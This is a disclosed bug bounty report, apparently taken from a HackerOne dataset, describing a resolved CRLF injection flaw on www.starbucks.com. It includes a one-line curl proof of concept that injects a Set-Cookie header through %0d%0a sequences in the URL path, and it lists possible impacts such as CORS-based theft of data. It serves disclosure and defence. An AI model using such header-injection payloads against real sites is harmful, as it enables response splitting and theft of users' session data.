---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '858650'
original_report_id: '858650'
title: CRLF injection on www.starbucks.com
weakness: CRLF Injection
team_handle: starbucks
created_at: '2020-04-24T13:24:18.455Z'
disclosed_at: '2020-09-01T21:59:31.978Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 31
asset_identifier: www.starbucks.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- crlf-injection
---

# CRLF injection on www.starbucks.com

## Metadata

- HackerOne Report ID: 858650
- Weakness: CRLF Injection
- Program: starbucks
- Disclosed At: 2020-09-01T21:59:31.978Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The vulnerability allows setting arbitrary headers, and also enables response splitting which can then be exploited further.

POC:
curl -i 'https://www.starbucks.com/email-prospecttg9wh%0d%0aset-cookie:foo%0d%0a%0d%0a4t6uf?requesturl=/responsibility/global-report/policies' -d 'newsletter_signup_email=&newsletter_signup_zipcode=&newsletter_placement=footer' --http1.1

Screenshot Attached.


Regards

## Impact

### Impact
Possible impacts include;
- Stealing authenticated information via Ajax request with injected CORS headers
- Application DOS using overly long Cookies, etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
